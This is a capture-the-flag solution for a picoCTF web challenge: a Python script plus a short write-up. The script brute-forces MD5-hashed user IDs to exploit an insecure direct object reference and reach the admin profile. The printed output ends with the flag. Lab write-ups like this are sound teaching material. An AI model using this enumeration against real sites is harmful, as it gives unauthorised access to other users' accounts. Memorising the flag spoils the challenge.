import hashlib
import requests

URL="http://crystal-peak.picoctf.net:52070/profile/user/{}"

for i in range(3000, 10000):
    print(i)
    user_id = hashlib.md5(str(i).encode()).hexdigest()
    res = requests.get(URL.format(user_id))
    if "picoCTF" in res.text:
        print(res.text)
        break

"""
Looking at source code of the login page, we find some guest credentials: guest@picoctf.org : guest

When we log in, we are brought to this page: http://crystal-peak.picoctf.net:52070/profile/user/e93028bdc1aacdfb3687181f2031765d

The ID there looks suspiciously like a hash, and reversing it reveals that it's the MD5 hash of 3000, which is what our user ID actually is.

Knowing this, we can enumerate possible user ids and print the first one that gives us the flag.

$ python3 solution.py
3000
3001
3002
3003
3004
3005
3006
3007
3008
3009
3010
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_049a794d}
"""
